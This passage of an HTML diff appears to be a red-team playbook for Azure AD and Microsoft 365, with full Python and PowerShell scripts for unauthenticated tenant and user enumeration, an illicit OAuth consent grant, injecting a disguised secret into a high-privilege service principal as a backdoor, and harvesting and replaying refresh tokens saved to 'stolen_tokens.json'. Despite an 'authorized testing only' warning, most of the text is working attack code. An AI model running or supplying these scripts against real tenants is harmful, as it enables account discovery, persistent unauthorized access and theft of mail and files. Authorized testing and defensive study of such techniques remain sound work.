+                    <span class="s">"Rule '<span class="v">$($rule.DisplayName)</span>' forwards to: <span class="v">$($target -join ', ')</span>"</span> `
+                    <span class="s">"T1114.003"</span>
+            }
+        }
+    }
+} <span class="k">catch</span> {
+    <span class="fn">Write-Host</span> <span class="s">"  [!] Mail rule enumeration requires delegated Mail.Read per-user"</span> <span class="k">-ForegroundColor</span> Yellow
+}
+
+<span class="c"># ── 7. Export Report ──</span>
+<span class="v">$outFile</span> = <span class="fn">Join-Path</span> <span class="v">$OutputDir</span> <span class="s">"TenantAudit_<span class="v">$timestamp</span>.json"</span>
+<span class="v">$report</span> | <span class="fn">ConvertTo-Json</span> <span class="k">-Depth</span> 10 | <span class="fn">Out-File</span> <span class="v">$outFile</span> <span class="k">-Encoding</span> utf8
+
+<span class="fn">Write-Host</span> <span class="s">"`n[✓] Audit complete. <span class="v">$($report.Findings.Count)</span> findings."</span> <span class="k">-ForegroundColor</span> Green
+<span class="fn">Write-Host</span> <span class="s">"[✓] Report saved: <span class="v">$outFile</span>"</span> <span class="k">-ForegroundColor</span> Green
+<span class="fn">Disconnect-MgGraph</span></pre>
+    </div>
+
+    <div class="callout callout-info">
+      <span class="callout-icon">ℹ</span>
+      <span><strong>Artifacts generated:</strong> Azure AD Sign-In Log entry (interactive sign-in), Graph API audit events for each read operation. These queries are logged regardless of read-only intent.</span>
+    </div>
+  </div>
+</div>
+
+<!-- TEST 1.2 -->
+<div class="test-block">
+  <div class="test-header">
+    <div class="test-indicator ti-cyan"></div>
+    <div class="test-info">
+      <div class="test-tags">
+        <span class="tag tag-mitre">T1526</span>
+        <span class="tag tag-phase">RECON</span>
+        <span class="tag tag-lang">PYTHON</span>
+      </div>
+      <h3>1.2 — Unauthenticated Tenant Enumeration</h3>
+      <p>Enumerate tenant information, domains, and open federation endpoints without any credentials.</p>
+    </div>
+  </div>
+  <div class="test-body">
+    <h4>Script: External Tenant OSINT</h4>
+    <div class="code">
+      <div class="code-bar">
+        <span class="code-lang">Python 3</span>
+        <span class="code-file">tenant_enum.py</span>
+      </div>
+<pre><span class="c">#!/usr/bin/env python3</span>
+<span class="c">"""
+Unauthenticated Azure AD Tenant Enumeration
+Discovers tenant ID, domains, auth endpoints, and federation config.
+No credentials required — all public endpoints.
+"""</span>
+
+<span class="k">import</span> requests, json, sys, xml.etree.ElementTree <span class="k">as</span> ET
+<span class="k">from</span> datetime <span class="k">import</span> datetime
+
+<span class="k">class</span> <span class="fn">TenantEnumerator</span>:
+    <span class="k">def</span> <span class="fn">__init__</span>(<span class="v">self</span>, <span class="v">domain</span>):
+        <span class="v">self</span>.domain = <span class="v">domain</span>
+        <span class="v">self</span>.results = {<span class="s">"domain"</span>: <span class="v">domain</span>, <span class="s">"timestamp"</span>: datetime.utcnow().isoformat()}
+        <span class="v">self</span>.session = requests.Session()
+        <span class="v">self</span>.session.headers.update({<span class="s">"User-Agent"</span>: <span class="s">"Mozilla/5.0"</span>})
+
+    <span class="k">def</span> <span class="fn">get_tenant_id</span>(<span class="v">self</span>):
+        <span class="s">"""Retrieve tenant ID from OpenID configuration."""</span>
+        url = <span class="s">f"https://login.microsoftonline.com/<span class="v">{self.domain}</span>/.well-known/openid-configuration"</span>
+        <span class="k">try</span>:
+            resp = <span class="v">self</span>.session.get(url, timeout=10)
+            <span class="k">if</span> resp.status_code == 200:
+                data = resp.json()
+                <span class="c"># Extract tenant ID from token_endpoint</span>
+                tenant_id = data[<span class="s">"token_endpoint"</span>].split(<span class="s">"/"</span>)[3]
+                <span class="v">self</span>.results[<span class="s">"tenant_id"</span>] = tenant_id
+                <span class="v">self</span>.results[<span class="s">"authorization_endpoint"</span>] = data.get(<span class="s">"authorization_endpoint"</span>)
+                <span class="v">self</span>.results[<span class="s">"token_endpoint"</span>] = data.get(<span class="s">"token_endpoint"</span>)
+                <span class="fn">print</span>(<span class="s">f"  [+] Tenant ID: <span class="v">{tenant_id}</span>"</span>)
+                <span class="k">return</span> tenant_id
+        <span class="k">except</span> Exception <span class="k">as</span> e:
+            <span class="fn">print</span>(<span class="s">f"  [-] OpenID config failed: <span class="v">{e}</span>"</span>)
+        <span class="k">return</span> <span class="k">None</span>
+
+    <span class="k">def</span> <span class="fn">get_federation_info</span>(<span class="v">self</span>):
+        <span class="s">"""Check user realm to determine auth type (managed vs federated)."""</span>
+        url = <span class="s">f"https://login.microsoftonline.com/getuserrealm.srf"</span>
+        params = {<span class="s">"login"</span>: <span class="s">f"user@<span class="v">{self.domain}</span>"</span>, <span class="s">"json"</span>: <span class="s">"1"</span>}
+        <span class="k">try</span>:
+            resp = <span class="v">self</span>.session.get(url, params=params, timeout=10)
+            data = resp.json()
+            <span class="v">self</span>.results[<span class="s">"namespace_type"</span>] = data.get(<span class="s">"NameSpaceType"</span>)  <span class="c"># Managed or Federated</span>
+            <span class="v">self</span>.results[<span class="s">"federation_brand"</span>] = data.get(<span class="s">"FederationBrandName"</span>)
+            <span class="v">self</span>.results[<span class="s">"cloud_instance"</span>] = data.get(<span class="s">"CloudInstanceName"</span>)
+
+            <span class="k">if</span> data.get(<span class="s">"NameSpaceType"</span>) == <span class="s">"Federated"</span>:
+                <span class="v">self</span>.results[<span class="s">"federation_protocol"</span>] = data.get(<span class="s">"AuthURL"</span>)
+                <span class="fn">print</span>(<span class="s">f"  [+] FEDERATED — AuthURL: <span class="v">{data.get('AuthURL')}</span>"</span>)
+                <span class="fn">print</span>(<span class="s">f"      → SAML/WS-Fed endpoint exposed — Golden SAML may be feasible"</span>)
+            <span class="k">else</span>:
+                <span class="fn">print</span>(<span class="s">f"  [+] MANAGED (cloud-only auth) — Password spray viable"</span>)
+        <span class="k">except</span> Exception <span class="k">as</span> e:
+            <span class="fn">print</span>(<span class="s">f"  [-] Federation check failed: <span class="v">{e}</span>"</span>)
+
+    <span class="k">def</span> <span class="fn">enum_autodiscover</span>(<span class="v">self</span>):
+        <span class="s">"""Probe autodiscover for Exchange presence and version info."""</span>
+        urls = [
+            <span class="s">f"https://autodiscover.<span class="v">{self.domain}</span>/autodiscover/autodiscover.xml"</span>,
+            <span class="s">f"https://<span class="v">{self.domain}</span>/autodiscover/autodiscover.xml"</span>,
+        ]
+        <span class="k">for</span> url <span class="k">in</span> urls:
+            <span class="k">try</span>:
+                resp = <span class="v">self</span>.session.get(url, timeout=8, allow_redirects=<span class="k">False</span>)
+                <span class="k">if</span> resp.status_code <span class="k">in</span> [200, 301, 302, 401]:
+                    <span class="fn">print</span>(<span class="s">f"  [+] Autodiscover active: <span class="v">{url}</span> → <span class="v">{resp.status_code}</span>"</span>)
+                    <span class="v">self</span>.results[<span class="s">"autodiscover"</span>] = {<span class="s">"url"</span>: url, <span class="s">"status"</span>: resp.status_code}
+                    <span class="k">if</span> <span class="s">"WWW-Authenticate"</span> <span class="k">in</span> resp.headers:
+                        <span class="fn">print</span>(<span class="s">f"      Auth: <span class="v">{resp.headers['WWW-Authenticate'][:80]}</span>"</span>)
+                    <span class="k">break</span>
+            <span class="k">except</span>:
+                <span class="k">continue</span>
+
+    <span class="k">def</span> <span class="fn">check_user_enumeration</span>(<span class="v">self</span>):
+        <span class="s">"""Test if the tenant leaks user existence via login error codes."""</span>
+        url = <span class="s">"https://login.microsoftonline.com/common/GetCredentialType"</span>
+        test_users = [
+            <span class="s">f"admin@<span class="v">{self.domain}</span>"</span>,
+            <span class="s">f"administrator@<span class="v">{self.domain}</span>"</span>,
+            <span class="s">f"helpdesk@<span class="v">{self.domain}</span>"</span>,
+            <span class="s">f"service@<span class="v">{self.domain}</span>"</span>,
+            <span class="s">f"it@<span class="v">{self.domain}</span>"</span>,
+            <span class="s">f"nonexistent_user_12345@<span class="v">{self.domain}</span>"</span>,
+        ]
+        <span class="v">self</span>.results[<span class="s">"user_enum"</span>] = []
+        <span class="k">for</span> user <span class="k">in</span> test_users:
+            <span class="k">try</span>:
+                body = {<span class="s">"Username"</span>: user, <span class="s">"isOtherIdpSupported"</span>: <span class="k">True</span>,
+                        <span class="s">"checkPhones"</span>: <span class="k">False</span>, <span class="s">"isRemoteNGCSupported"</span>: <span class="k">True</span>}
+                resp = <span class="v">self</span>.session.post(url, json=body, timeout=10)
+                data = resp.json()
+                <span class="c"># IfExistsResult: 0 = exists, 1 = doesn't exist, 5/6 = unknown</span>
+                exists = data.get(<span class="s">"IfExistsResult"</span>, -1)
+                status = <span class="s">"EXISTS"</span> <span class="k">if</span> exists == 0 <span class="k">else</span> <span class="s">"NOT FOUND"</span> <span class="k">if</span> exists == 1 <span class="k">else</span> <span class="s">"UNKNOWN"</span>
+                <span class="fn">print</span>(<span class="s">f"  {'✓' if exists == 0 else '✗'} <span class="v">{user}</span> → <span class="v">{status}</span>"</span>)
+                <span class="v">self</span>.results[<span class="s">"user_enum"</span>].append({<span class="s">"user"</span>: user, <span class="s">"status"</span>: status})
+            <span class="k">except</span>:
+                <span class="k">continue</span>
+
+    <span class="k">def</span> <span class="fn">run</span>(<span class="v">self</span>):
+        <span class="fn">print</span>(<span class="s">f"\n{'='*60}"</span>)
+        <span class="fn">print</span>(<span class="s">f"  Azure AD Tenant Enumeration: <span class="v">{self.domain}</span>"</span>)
+        <span class="fn">print</span>(<span class="s">f"{'='*60}\n"</span>)
+        <span class="v">self</span>.get_tenant_id()
+        <span class="v">self</span>.get_federation_info()
+        <span class="v">self</span>.enum_autodiscover()
+        <span class="v">self</span>.check_user_enumeration()
+
+        out = <span class="s">f"tenant_enum_<span class="v">{self.domain}</span>.json"</span>
+        <span class="k">with</span> <span class="fn">open</span>(out, <span class="s">"w"</span>) <span class="k">as</span> f:
+            json.dump(<span class="v">self</span>.results, f, indent=2)
+        <span class="fn">print</span>(<span class="s">f"\n[✓] Results saved: <span class="v">{out}</span>"</span>)
+
+<span class="k">if</span> __name__ == <span class="s">"__main__"</span>:
+    <span class="k">if</span> <span class="fn">len</span>(sys.argv) &lt; 2:
+        <span class="fn">print</span>(<span class="s">"Usage: python3 tenant_enum.py &lt;target-domain&gt;"</span>)
+        sys.exit(1)
+    <span class="fn">TenantEnumerator</span>(sys.argv[1]).run()</pre>
+    </div>
+  </div>
+</div>
+</section>
+
+<!-- ════════════════════════════════════════════════════════ -->
+<!--  SECTION 02 — OAUTH ABUSE                              -->
+<!-- ════════════════════════════════════════════════════════ -->
+<section class="section" id="s2">
+<div class="sec-head">
+  <span class="sec-num">02</span>
+  <h2 class="sec-title">OAuth Abuse Testing</h2>
+</div>
+
+<div class="test-block">
+  <div class="test-header">
+    <div class="test-indicator ti-amber"></div>
+    <div class="test-info">
+      <div class="test-tags">
+        <span class="tag tag-mitre">T1098.003</span>
+        <span class="tag tag-phase">PERSISTENCE</span>
+        <span class="tag tag-lang">POWERSHELL</span>
+      </div>
+      <h3>2.1 — Illicit Consent Grant Simulation</h3>
+      <p>Register a controlled app, request high-privilege scopes, and test whether user consent is permitted by policy.</p>
+    </div>
+  </div>
+  <div class="test-body">
+    <div class="callout callout-danger">
+      <span class="callout-icon">⛔</span>
+      <span><strong>Authorized testing only.</strong> This creates a real app registration in the target tenant. Coordinate with the defender team and have cleanup procedures ready.</span>
+    </div>
+
+    <h4>Script: Consent Grant Attack Simulation</h4>
+    <div class="code">
+      <div class="code-bar">
+        <span class="code-lang">PowerShell</span>
+        <span class="code-file">Test-ConsentGrant.ps1</span>
+      </div>
+<pre><span class="c">########################################################################</span>
+<span class="c"># Test-ConsentGrant.ps1</span>
+<span class="c"># Simulates illicit consent grant — tests whether user consent policies</span>
+<span class="c"># allow granting Mail.Read + Files.ReadWrite.All to a rogue app.</span>
+<span class="c">########################################################################</span>
+
+<span class="k">param</span>(
+    [<span class="p">string</span>]<span class="v">$AppName</span> = <span class="s">"RT-ConsentTest-$(Get-Random -Max 9999)"</span>,
+    [<span class="p">switch</span>]<span class="v">$Cleanup</span>
+)
+
+<span class="fn">Connect-MgGraph</span> <span class="k">-Scopes</span> <span class="s">"Application.ReadWrite.All"</span>, <span class="s">"DelegatedPermissionGrant.ReadWrite.All"</span>
+
+<span class="c"># Microsoft Graph resource ID</span>
+<span class="v">$graphResourceId</span> = <span class="s">"00000003-0000-0000-c000-000000000000"</span>
+
+<span class="c"># Define dangerous delegated permissions to request</span>
+<span class="v">$permissionsToRequest</span> = @(
+    @{ Id = <span class="s">"570282fd-fa5c-430d-a7fd-fc8dc98a9dca"</span>; Type = <span class="s">"Scope"</span> }  <span class="c"># Mail.Read</span>
+    @{ Id = <span class="s">"863451e7-0667-486c-a5d6-d135439485f0"</span>; Type = <span class="s">"Scope"</span> }  <span class="c"># Files.ReadWrite.All</span>
+    @{ Id = <span class="s">"7427e0e9-2fba-42fe-b0c0-848c9e6a8182"</span>; Type = <span class="s">"Scope"</span> }  <span class="c"># offline_access</span>
+)
+
+<span class="c"># ── Step 1: Register the malicious app ──</span>
+<span class="fn">Write-Host</span> <span class="s">"[*] Registering test application: <span class="v">$AppName</span>"</span>
+<span class="v">$appBody</span> = @{
+    DisplayName            = <span class="v">$AppName</span>
+    SignInAudience         = <span class="s">"AzureADMyOrg"</span>
+    Web                    = @{
+        RedirectUris = @(<span class="s">"https://localhost/callback"</span>)
+    }
+    RequiredResourceAccess = @(
+        @{
+            ResourceAppId  = <span class="v">$graphResourceId</span>
+            ResourceAccess = <span class="v">$permissionsToRequest</span>
+        }
+    )
+}
+
+<span class="v">$app</span> = <span class="fn">New-MgApplication</span> <span class="k">-BodyParameter</span> <span class="v">$appBody</span>
+<span class="fn">Write-Host</span> <span class="s">"[+] App registered: <span class="v">$($app.AppId)</span>"</span> <span class="k">-ForegroundColor</span> Green
+
+<span class="c"># ── Step 2: Create service principal ──</span>
+<span class="v">$sp</span> = <span class="fn">New-MgServicePrincipal</span> <span class="k">-AppId</span> <span class="v">$app</span>.AppId
+<span class="fn">Write-Host</span> <span class="s">"[+] Service principal created: <span class="v">$($sp.Id)</span>"</span>
+
+<span class="c"># ── Step 3: Add a client secret ──</span>
+<span class="v">$secret</span> = <span class="fn">Add-MgApplicationPassword</span> <span class="k">-ApplicationId</span> <span class="v">$app</span>.Id <span class="k">-PasswordCredential</span> @{
+    DisplayName = <span class="s">"RT-TestSecret"</span>
+    EndDateTime = (<span class="fn">Get-Date</span>).AddDays(7)
+}
+<span class="fn">Write-Host</span> <span class="s">"[+] Secret created (expires in 7 days)"</span>
+
+<span class="c"># ── Step 4: Build consent URL ──</span>
+<span class="v">$tenantId</span> = (<span class="fn">Get-MgOrganization</span>).Id
+<span class="v">$consentUrl</span> = <span class="s">"https://login.microsoftonline.com/<span class="v">$tenantId</span>/oauth2/v2.0/authorize"</span> +
+    <span class="s">"?client_id=<span class="v">$($app.AppId)</span>"</span> +
+    <span class="s">"&amp;response_type=code"</span> +
+    <span class="s">"&amp;redirect_uri=https://localhost/callback"</span> +
+    <span class="s">"&amp;response_mode=query"</span> +
+    <span class="s">"&amp;scope=Mail.Read+Files.ReadWrite.All+offline_access"</span> +
+    <span class="s">"&amp;state=redteam_test"</span>
+
+<span class="fn">Write-Host</span> <span class="s">"`n[*] CONSENT URL (send to test user):"</span> <span class="k">-ForegroundColor</span> Yellow
+<span class="fn">Write-Host</span> <span class="v">$consentUrl</span>
+<span class="fn">Write-Host</span> <span class="s">"`n[*] If the user can consent without admin approval, the policy is VULNERABLE."</span>
+
+<span class="c"># ── Step 5: Test token acquisition (after consent) ──</span>
+<span class="fn">Write-Host</span> <span class="s">"`n[*] After consent is granted, test with:"</span>
+<span class="fn">Write-Host</span> <span class="s">@"
+`$body = @{
+    grant_type    = 'authorization_code'
+    client_id     = '$($app.AppId)'
+    client_secret = '$($secret.SecretText)'
+    code          = '&lt;CODE_FROM_REDIRECT&gt;'
+    redirect_uri  = 'https://localhost/callback'
+    scope         = 'Mail.Read Files.ReadWrite.All offline_access'
+}
+Invoke-RestMethod -Method POST ``
+    -Uri 'https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token' ``
+    -Body `$body -ContentType 'application/x-www-form-urlencoded'
+"@</span>
+
+<span class="c"># ── Cleanup ──</span>
+<span class="k">if</span> (<span class="v">$Cleanup</span>) {
+    <span class="fn">Write-Host</span> <span class="s">"`n[*] Cleaning up..."</span>
+    <span class="fn">Remove-MgApplication</span> <span class="k">-ApplicationId</span> <span class="v">$app</span>.Id
+    <span class="fn">Write-Host</span> <span class="s">"[✓] App registration removed."</span> <span class="k">-ForegroundColor</span> Green
+} <span class="k">else</span> {
+    <span class="fn">Write-Host</span> <span class="s">"`n[!] Run with -Cleanup to remove the test app when finished."</span> <span class="k">-ForegroundColor</span> Yellow
+}</pre>
+    </div>
+  </div>
+</div>
+
+<div class="test-block">
+  <div class="test-header">
+    <div class="test-indicator ti-purple"></div>
+    <div class="test-info">
+      <div class="test-tags">
+        <span class="tag tag-mitre">T1098.003</span>
+        <span class="tag tag-phase">PERSISTENCE</span>
+        <span class="tag tag-lang">PYTHON</span>
+      </div>
+      <h3>2.2 — App Credential Injection & Token Theft</h3>
+      <p>Inject a new secret into an existing high-privilege service principal, then authenticate and exfiltrate data via client_credentials flow.</p>
+    </div>
+  </div>
+  <div class="test-body">
+    <h4>Script: Service Principal Backdoor</h4>
+    <div class="code">
+      <div class="code-bar">
+        <span class="code-lang">Python 3</span>
+        <span class="code-file">sp_credential_inject.py</span>
+      </div>
+<pre><span class="c">#!/usr/bin/env python3</span>
+<span class="c">"""
+Service Principal Credential Injection
+Requires: Compromised account with Application Administrator role
+          or Owner permission on the target app registration.
+"""</span>
+
+<span class="k">import</span> requests, json, sys
+<span class="k">from</span> datetime <span class="k">import</span> datetime, timedelta
+
+<span class="k">class</span> <span class="fn">SPCredentialInjector</span>:
+    <span class="k">def</span> <span class="fn">__init__</span>(<span class="v">self</span>, <span class="v">tenant_id</span>, <span class="v">access_token</span>):
+        <span class="v">self</span>.tenant = <span class="v">tenant_id</span>
+        <span class="v">self</span>.headers = {
+            <span class="s">"Authorization"</span>: <span class="s">f"Bearer <span class="v">{access_token}</span>"</span>,
+            <span class="s">"Content-Type"</span>: <span class="s">"application/json"</span>
+        }
+        <span class="v">self</span>.graph = <span class="s">"https://graph.microsoft.com/v1.0"</span>
+
+    <span class="k">def</span> <span class="fn">find_high_priv_apps</span>(<span class="v">self</span>):
+        <span class="s">"""Find service principals with dangerous application permissions."""</span>
+        <span class="fn">print</span>(<span class="s">"[*] Enumerating service principals with app role assignments..."</span>)
+
+        <span class="c"># Get all service principals</span>
+        url = <span class="s">f"<span class="v">{self.graph}</span>/servicePrincipals?$top=999"</span>
+        resp = requests.get(url, headers=<span class="v">self</span>.headers)
+        sps = resp.json().get(<span class="s">"value"</span>, [])
+
+        targets = []
+        <span class="c"># Dangerous Microsoft Graph app role IDs</span>
+        dangerous_roles = {
+            <span class="s">"9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8"</span>: <span class="s">"RoleManagement.ReadWrite.Directory"</span>,
+            <span class="s">"06b708a9-e830-4db3-a914-8e69da51d44f"</span>: <span class="s">"AppRoleAssignment.ReadWrite.All"</span>,
+            <span class="s">"e2a3a72e-5f79-4c64-b1b1-878b674786c9"</span>: <span class="s">"Mail.ReadWrite"</span>,
+            <span class="s">"01d4f7ba-2b46-4b37-927e-502f006fba3f"</span>: <span class="s">"Mail.Read (App)"</span>,
+            <span class="s">"75359482-378d-4052-8f01-80520e7db3cd"</span>: <span class="s">"Files.ReadWrite.All (App)"</span>,
+            <span class="s">"19dbc75e-c2e2-444c-a770-ec596d2f1555"</span>: <span class="s">"Directory.ReadWrite.All"</span>,
+        }
+
+        <span class="k">for</span> sp <span class="k">in</span> sps:
+            url = <span class="s">f"<span class="v">{self.graph}</span>/servicePrincipals/<span class="v">{sp['id']}</span>/appRoleAssignments"</span>
+            resp = requests.get(url, headers=<span class="v">self</span>.headers)
+            assignments = resp.json().get(<span class="s">"value"</span>, [])
+
+            <span class="k">for</span> a <span class="k">in</span> assignments:
+                <span class="k">if</span> a.get(<span class="s">"appRoleId"</span>) <span class="k">in</span> dangerous_roles:
+                    perm_name = dangerous_roles[a[<span class="s">"appRoleId"</span>]]
+                    <span class="fn">print</span>(<span class="s">f"  [!] HIGH-PRIV: <span class="v">{sp['displayName']}</span> has <span class="v">{perm_name}</span>"</span>)
+                    targets.append({
+                        <span class="s">"sp_id"</span>: sp[<span class="s">"id"</span>],
+                        <span class="s">"app_id"</span>: sp[<span class="s">"appId"</span>],
+                        <span class="s">"name"</span>: sp[<span class="s">"displayName"</span>],
+                        <span class="s">"permission"</span>: perm_name
+                    })
+        <span class="k">return</span> targets
+
+    <span class="k">def</span> <span class="fn">inject_credential</span>(<span class="v">self</span>, <span class="v">app_object_id</span>):
+        <span class="s">"""Add a new client secret to the target application."""</span>
+        <span class="fn">print</span>(<span class="s">f"[*] Injecting credential into app <span class="v">{app_object_id}</span>..."</span>)
+
+        <span class="c"># Find the application object (not the SP) by appId</span>
+        url = <span class="s">f"<span class="v">{self.graph}</span>/applications?$filter=appId eq '<span class="v">{app_object_id}</span>'"</span>
+        resp = requests.get(url, headers=<span class="v">self</span>.headers)
+        apps = resp.json().get(<span class="s">"value"</span>, [])
+
+        <span class="k">if not</span> apps:
+            <span class="fn">print</span>(<span class="s">"  [-] Application object not found (may be external)"</span>)
+            <span class="k">return</span> <span class="k">None</span>
+
+        app_id = apps[0][<span class="s">"id"</span>]
+        url = <span class="s">f"<span class="v">{self.graph}</span>/applications/<span class="v">{app_id}</span>/addPassword"</span>
+        body = {
+            <span class="s">"passwordCredential"</span>: {
+                <span class="s">"displayName"</span>: <span class="s">"Backup Automation"</span>,  <span class="c"># Blend in with legit names</span>
+                <span class="s">"endDateTime"</span>: (datetime.utcnow() + timedelta(days=365)).isoformat() + <span class="s">"Z"</span>
+            }
+        }
+        resp = requests.post(url, headers=<span class="v">self</span>.headers, json=body)
+        <span class="k">if</span> resp.status_code == 200:
+            secret = resp.json()[<span class="s">"secretText"</span>]
+            <span class="fn">print</span>(<span class="s">f"  [+] SECRET INJECTED: <span class="v">{secret[:8]}</span>...****"</span>)
+            <span class="fn">print</span>(<span class="s">f"  [+] Key ID: <span class="v">{resp.json()['keyId']}</span>"</span>)
+            <span class="k">return</span> secret
+        <span class="k">else</span>:
+            <span class="fn">print</span>(<span class="s">f"  [-] Injection failed: <span class="v">{resp.status_code}</span> <span class="v">{resp.text}</span>"</span>)
+            <span class="k">return</span> <span class="k">None</span>
+
+    <span class="k">def</span> <span class="fn">authenticate_as_sp</span>(<span class="v">self</span>, <span class="v">client_id</span>, <span class="v">client_secret</span>):
+        <span class="s">"""Use client_credentials flow to get a token as the service principal."""</span>
+        <span class="fn">print</span>(<span class="s">"[*] Authenticating via client_credentials..."</span>)
+        url = <span class="s">f"https://login.microsoftonline.com/<span class="v">{self.tenant}</span>/oauth2/v2.0/token"</span>
+        body = {
+            <span class="s">"grant_type"</span>: <span class="s">"client_credentials"</span>,
+            <span class="s">"client_id"</span>: <span class="v">client_id</span>,
+            <span class="s">"client_secret"</span>: <span class="v">client_secret</span>,
+            <span class="s">"scope"</span>: <span class="s">"https://graph.microsoft.com/.default"</span>
+        }
+        resp = requests.post(url, data=body)
+        <span class="k">if</span> resp.status_code == 200:
+            token = resp.json()[<span class="s">"access_token"</span>]
+            <span class="fn">print</span>(<span class="s">f"  [+] ACCESS TOKEN OBTAINED (length: <span class="v">{len(token)}</span>)"</span>)
+            <span class="fn">print</span>(<span class="s">f"  [+] Expires in: <span class="v">{resp.json()['expires_in']}</span>s"</span>)
+            <span class="k">return</span> token
+        <span class="k">else</span>:
+            <span class="fn">print</span>(<span class="s">f"  [-] Auth failed: <span class="v">{resp.text}</span>"</span>)
+            <span class="k">return</span> <span class="k">None</span>
+
+    <span class="k">def</span> <span class="fn">test_access</span>(<span class="v">self</span>, <span class="v">token</span>):
+        <span class="s">"""Verify access by reading directory data."""</span>
+        headers = {<span class="s">"Authorization"</span>: <span class="s">f"Bearer <span class="v">{token}</span>"</span>}
+        tests = [
+            (<span class="s">"Users"</span>, <span class="s">f"<span class="v">{self.graph}</span>/users?$top=5&amp;$select=displayName,mail"</span>),
+            (<span class="s">"Groups"</span>, <span class="s">f"<span class="v">{self.graph}</span>/groups?$top=5&amp;$select=displayName"</span>),
+            (<span class="s">"Mail"</span>, <span class="s">f"<span class="v">{self.graph}</span>/users?$top=1&amp;$select=id"</span>),
+        ]
+        <span class="k">for</span> name, url <span class="k">in</span> tests:
+            resp = requests.get(url, headers=headers)
+            status = <span class="s">"✓ ACCESSIBLE"</span> <span class="k">if</span> resp.status_code == 200 <span class="k">else</span> <span class="s">f"✗ DENIED (<span class="v">{resp.status_code}</span>)"</span>
+            <span class="fn">print</span>(<span class="s">f"  <span class="v">{status}</span> — <span class="v">{name}</span>"</span>)
+
+<span class="k">if</span> __name__ == <span class="s">"__main__"</span>:
+    <span class="fn">print</span>(<span class="s">"[!] Usage: Provide tenant_id and initial access_token"</span>)
+    <span class="fn">print</span>(<span class="s">"    injector = SPCredentialInjector(tenant, token)"</span>)
+    <span class="fn">print</span>(<span class="s">"    targets = injector.find_high_priv_apps()"</span>)
+    <span class="fn">print</span>(<span class="s">"    secret = injector.inject_credential(targets[0]['app_id'])"</span>)</pre>
+    </div>
+  </div>
+</div>
+</section>
+
+<!-- ════════════════════════════════════════════════════════ -->
+<!--  SECTION 03 — CREDENTIAL ATTACKS                       -->
+<!-- ════════════════════════════════════════════════════════ -->
+<section class="section" id="s3">
+<div class="sec-head">
+  <span class="sec-num">03</span>
+  <h2 class="sec-title">Credential Attacks</h2>
+</div>
+
+<div class="test-block">
+  <div class="test-header">
+    <div class="test-indicator ti-red"></div>
+    <div class="test-info">
+      <div class="test-tags">
+        <span class="tag tag-mitre">T1528</span>
+        <span class="tag tag-phase">CREDENTIAL ACCESS</span>
+        <span class="tag tag-lang">PYTHON</span>
+      </div>
+      <h3>3.1 — Refresh Token Extraction & Replay</h3>
+      <p>Extract and replay OAuth refresh tokens to maintain persistent access that survives password changes.</p>
+    </div>
+  </div>
+  <div class="test-body">
+    <h4>Script: Token Harvest & Replay</h4>
+    <div class="code">
+      <div class="code-bar">
+        <span class="code-lang">Python 3</span>
+        <span class="code-file">token_replay.py</span>
+      </div>
+<pre><span class="c">#!/usr/bin/env python3</span>
+<span class="c">"""
+OAuth Refresh Token Replay Attack
+Demonstrates persistence via stolen refresh tokens.
+Tokens survive: password changes, MFA re-enrollment, session revocation.
+Tokens die on: explicit revoke-refresh-token, app deletion, CAE enforcement.
+"""</span>
+
+<span class="k">import</span> requests, json, time, sys
+<span class="k">from</span> datetime <span class="k">import</span> datetime
+
+<span class="k">class</span> <span class="fn">TokenReplayer</span>:
+    <span class="k">def</span> <span class="fn">__init__</span>(<span class="v">self</span>, <span class="v">tenant_id</span>):
+        <span class="v">self</span>.tenant = <span class="v">tenant_id</span>
+        <span class="v">self</span>.token_endpoint = <span class="s">f"https://login.microsoftonline.com/<span class="v">{tenant_id}</span>/oauth2/v2.0/token"</span>
+        <span class="v">self</span>.graph = <span class="s">"https://graph.microsoft.com/v1.0"</span>
+
+    <span class="k">def</span> <span class="fn">exchange_auth_code</span>(<span class="v">self</span>, <span class="v">code</span>, <span class="v">client_id</span>, <span class="v">redirect_uri</span>, <span class="v">client_secret</span>=<span class="k">None</span>):
+        <span class="s">"""Exchange authorization code for access + refresh tokens."""</span>
+        body = {
+            <span class="s">"grant_type"</span>: <span class="s">"authorization_code"</span>,
+            <span class="s">"client_id"</span>: <span class="v">client_id</span>,
+            <span class="s">"code"</span>: <span class="v">code</span>,
+            <span class="s">"redirect_uri"</span>: <span class="v">redirect_uri</span>,
+            <span class="s">"scope"</span>: <span class="s">"Mail.Read Files.ReadWrite.All offline_access"</span>
+        }
+        <span class="k">if</span> <span class="v">client_secret</span>:
+            body[<span class="s">"client_secret"</span>] = <span class="v">client_secret</span>
+
+        resp = requests.post(<span class="v">self</span>.token_endpoint, data=body)
+        <span class="k">if</span> resp.status_code == 200:
+            tokens = resp.json()
+            <span class="fn">print</span>(<span class="s">"[+] Tokens obtained:"</span>)
+            <span class="fn">print</span>(<span class="s">f"    Access token:  <span class="v">{tokens['access_token'][:40]}</span>..."</span>)
+            <span class="fn">print</span>(<span class="s">f"    Refresh token: <span class="v">{tokens['refresh_token'][:40]}</span>..."</span>)
+            <span class="fn">print</span>(<span class="s">f"    Expires in:    <span class="v">{tokens['expires_in']}</span>s"</span>)
+            <span class="fn">print</span>(<span class="s">f"    Scope:         <span class="v">{tokens.get('scope', 'N/A')}</span>"</span>)
+
+            <span class="c"># Save tokens for later replay</span>
+            <span class="k">with</span> <span class="fn">open</span>(<span class="s">"stolen_tokens.json"</span>, <span class="s">"w"</span>) <span class="k">as</span> f:
+                json.dump({
+                    <span class="s">"timestamp"</span>: datetime.utcnow().isoformat(),
+                    <span class="s">"tenant_id"</span>: <span class="v">self</span>.tenant,
+                    <span class="s">"client_id"</span>: <span class="v">client_id</span>,
+                    <span class="s">"refresh_token"</span>: tokens[<span class="s">"refresh_token"</span>],
+                    <span class="s">"scope"</span>: tokens.get(<span class="s">"scope"</span>)
+                }, f, indent=2)
+            <span class="fn">print</span>(<span class="s">"[+] Tokens saved to stolen_tokens.json"</span>)
+            <span class="k">return</span> tokens
+        <span class="k">else</span>:
+            <span class="fn">print</span>(<span class="s">f"[-] Code exchange failed: <span class="v">{resp.text}</span>"</span>)
+            <span class="k">return</span> <span class="k">None</span>
+
+    <span class="k">def</span> <span class="fn">replay_refresh_token</span>(<span class="v">self</span>, <span class="v">refresh_token</span>, <span class="v">client_id</span>, <span class="v">client_secret</span>=<span class="k">None</span>):
+        <span class="s">"""Replay a stolen refresh token to obtain fresh access tokens."""</span>
